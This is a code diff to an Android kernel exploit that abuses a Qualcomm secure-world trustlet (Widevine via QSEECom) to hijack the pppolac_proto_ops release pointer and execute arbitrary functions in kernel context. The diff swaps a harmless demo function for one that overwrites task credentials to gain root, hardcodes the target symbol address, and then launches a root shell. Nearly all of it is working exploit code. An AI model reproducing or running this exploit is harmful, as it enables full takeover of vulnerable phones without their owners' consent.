@@ -95,11 +95,10 @@ uint32_t execute_in_kernel(uint32_t func_addr, uint32_t arg1, uint32_t arg2,
 }
 
 /**
- * A small sample function which will be executed in the kernel.
+ * The function which will be executed in the kernel.
  */
-int foo() {
-	return 0x1337;
-}
+void
+obtain_root_privilege_by_modify_task_cred(void);
 
 int main() {
 
@@ -128,8 +127,8 @@ int main() {
 	}
 	printf("[+] Found application at: %p\n", app);
 
-	//Searching for the kernel's symbol table
-	uint32_t pppolac_proto_ops_address = kallsyms_lookup_name(handle, app, "pppolac_proto_ops");
+	//hardcode pppolac_proto_ops's address
+	uint32_t pppolac_proto_ops_address = PPPOLAC_PROTO_OPS_ADDRESS;
 	printf("[+] pppolac_proto_ops: 0x%08X\n", pppolac_proto_ops_address);
 	uint32_t pppolac_proto_ops_phys_addr = pppolac_proto_ops_address - PHYS_TO_VIRT;
 	printf("[+] pppolac_proto_ops physical address: 0x%08X\n", pppolac_proto_ops_phys_addr);
@@ -140,13 +139,17 @@ int main() {
 	map_write_dword(handle, app, (uint32_t)kernel_context_execute_func, pppolac_proto_ops_release);
 	printf("[+] Hijacked pointer: %08X\n", map_read_dword(handle, app, pppolac_proto_ops_release));	
 
-	//Executing a small function in the kernel
-	execute_in_kernel((uint32_t)foo, 0, 0, 0, 0);
+	//Executing function in the kernel
+	execute_in_kernel((uint32_t)obtain_root_privilege_by_modify_task_cred, 0, 0, 0, 0);
 	printf("[+] Function returned: %08X\n", g_ret_val);
 
 	//Unloading the widevine app
 	(*handle->QSEECom_shutdown_app)((struct QSEECom_handle **)&handle->qseecom);
 	printf("[+] Widevine unload res: %d\n", res);
+
+	printf("uid=%d\n", getuid());
+
+	system("/system/bin/sh");
 
 	return 0;
 
